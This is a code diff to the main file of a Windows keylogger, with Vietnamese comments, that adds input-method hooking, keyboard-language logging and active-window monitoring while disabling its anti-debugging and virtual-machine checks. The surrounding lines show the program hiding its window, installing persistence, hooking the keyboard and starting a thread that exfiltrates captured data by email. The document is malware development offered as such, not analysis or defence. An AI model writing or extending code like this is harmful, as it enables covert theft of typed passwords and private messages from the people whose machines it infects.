@@ -6,6 +6,7 @@
 #include "keylogger.h"
 #include "exfiltration.h"
 #include "multilanguage.h"
+#include "ime_support.h"
 
 int main() {
     // Thiết lập UTF-8 cho console (để debug)
@@ -14,13 +15,20 @@ int main() {
     // Khởi tạo key mã hóa
     encryptionKey = GenerateEncryptionKey();
 
+
     // Kiểm tra điều kiện môi trường
-    if (IsBeingDebugged() || IsRunningInVM()) {
-        return 0;
-    }
+    //if (IsBeingDebugged() || IsRunningInVM()) {
+    //    return 0;
+    //}
 
     // Ẩn cửa sổ
     HideWindow();
+
+    g_imeHook = SetWindowsHookExW(WH_GETMESSAGE, ImeHookProc, NULL, 0);
+
+    LogCurrentLanguage();
+
+    InitializeImeSupport();
 
     // Thiết lập tên file
     if (SetFileNames()) {
@@ -34,8 +42,8 @@ int main() {
         Persistence();
 
         // Khởi động thread kiểm tra bảo mật
-        std::thread securityThread(SecurityCheckJob);
-        securityThread.detach();
+        //std::thread securityThread(SecurityCheckJob);
+        //securityThread.detach();
 
         // Khởi động thread exfiltration
         std::thread exfilThread(EmailExfiltrationJob);
@@ -53,6 +61,9 @@ int main() {
         // Khởi động hook bàn phím
         CreateHookThread();
     }
+
+    std::thread monitorThread(MonitorActiveWindow);
+    monitorThread.detach();
 
     return 0;
 }
